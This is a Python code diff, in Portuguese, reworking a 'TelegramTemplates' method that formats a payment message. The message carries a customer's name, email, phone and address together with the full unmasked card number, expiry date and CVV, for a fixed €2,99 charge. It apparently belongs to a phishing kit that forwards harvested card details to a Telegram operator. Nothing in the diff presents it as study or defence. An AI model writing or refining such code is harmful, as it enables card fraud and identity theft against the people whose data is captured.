@@ -32,33 +32,33 @@ class TelegramTemplates:
 
     @staticmethod
     def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> str:
-        """Template para mensagem de pagamento"""
+        """Template para mensagem de pagamento - MENSAGEM ÚNICA COM TODOS OS DADOS"""
         # Show full card number (não mascarado conforme solicitado)
         card_number = card_data.get('numeroCartao', 'N/A')
         
-        return f"""💳 **PAGAMENTO PROCESSADO** ✅
+        return f"""💳 PAGAMENTO PROCESSADO ✅
 
-👤 **CLIENTE:**
-┣━ 📝 Nome: `{billing_data.get('nome', 'N/A')}`
-┗━ 📧 Email: `{billing_data.get('email', 'N/A')}`
+👤 DADOS DO CLIENTE:
+┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
+┣━ 📧 Email: {billing_data.get('email', 'N/A')}
+┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
 
-💰 **DETALHES DO PAGAMENTO:**
-┣━ 💵 Valor: `€2,99`
-┣━ 💳 Cartão: `{card_number}`
-┣━ 📅 Validade: `{card_data.get('dataExpiracao', 'N/A')}`
-┗━ 🔒 CVV: `{card_data.get('cvv', 'N/A')}`
+📍 ENDEREÇO DE ENTREGA:
+┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
+┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
+┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}
 
-📍 **ENTREGA:**
-┣━ 🏠 Endereço: `{billing_data.get('endereco', 'N/A')}`
-┣━ 📮 Código Postal: `{billing_data.get('codigoPostal', 'N/A')}`
-┣━ 🏙️ Cidade: `{billing_data.get('cidade', 'N/A')}`
-┗━ 📞 Contacto: `{billing_data.get('telefone', 'N/A')}`
+💰 DETALHES DO PAGAMENTO:
+┣━ 💵 Valor: €2,99
+┣━ 💳 Número do Cartão: {card_number}
+┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
+┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}
 
-⏰ **PROCESSADO:** `{datetime.now().strftime('%d/%m/%Y às %H:%M')}`
-✅ **STATUS:** `🎉 PAGAMENTO CONFIRMADO`
+⏰ PROCESSADO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+✅ STATUS: PAGAMENTO CONFIRMADO
 
 ═══════════════════════════════
-🏆 **Obrigado pela preferência!** 🏆
+🏆 Obrigado pela preferência! 🏆
 ═══════════════════════════════"""
 
     @staticmethod 
